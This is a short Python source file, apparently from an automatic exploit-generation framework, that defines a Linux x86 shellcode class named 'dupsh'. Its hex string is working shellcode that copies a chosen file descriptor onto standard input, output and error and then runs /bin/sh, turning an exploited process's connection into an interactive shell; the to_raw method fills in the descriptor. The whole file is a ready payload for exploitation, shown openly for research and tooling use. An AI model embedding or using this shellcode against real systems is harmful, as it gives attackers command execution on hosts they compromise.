import logging
from rex.exploit.shellcode import Shellcode

l = logging.getLogger("rex.exploit.shellcodes.linux_x86_dupsh")

class LinuxX86Dupsh(Shellcode):
    # TODO: should be 'linux' once CLE can identify linux files
    supported_platforms = ["unix"]

    arch = "X86"

    name = "dupsh"

    hex_code = "31d2b2%02x89d36a0359496a3f58cd8075f831d26a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80"

    def to_raw(self, fd):
        #pylint:disable=arguments-differ
        l.debug("generating dupsh from fd %d", fd)

        if fd < 0 or fd >= 256:
            raise ValueError("invalid port specified")

        return bytes.fromhex(self.hex_code % fd)

    @property
    def has_options(self):
        return True
